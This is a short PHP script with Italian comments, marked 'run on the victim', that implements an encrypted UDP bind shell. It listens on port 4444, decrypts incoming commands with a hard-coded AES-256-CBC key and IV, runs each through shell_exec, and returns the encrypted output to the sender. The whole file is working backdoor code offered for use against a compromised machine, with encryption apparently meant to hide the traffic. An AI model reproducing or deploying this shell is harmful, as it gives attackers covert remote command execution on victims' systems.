<?php
// run on the victim:

$port = 4444;
$key = 'AES256key'; 
$method = 'AES-256-CBC';
$vettore = '1234567890123456';

if (($sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP)) === false) {
    exit("Errore creazione socket\n");
}

if (socket_bind($sock, '0.0.0.0', $port) === false) {
    exit("Errore bind\n");
}

echo "bind Shell in ascolto sulla porta $port UDP...\n";

while (true) {
    $buffer = '';
    $ipsender = '';
    $port = 0;

    // ricevo e decifro il comando da eseguire
    socket_recvfrom($sock, $buffer, 1024, 0, $ipsender, $port);
    $cmd = openssl_decrypt($buffer, $method, $key, 0, $vettore);

    //eseguo il comando ricevuto ( 2>&1 per la gestione degli errori )
    $output = shell_exec($cmd . ' 2>&1');

    //cifro i risultato e li invio
    $encrypted_output = openssl_encrypt($output, $method, $key, 0, $vettore);
    socket_sendto($sock, $encrypted_output, strlen($encrypted_output), 0, $ipsender, $port);
}

socket_close($sock);
?>
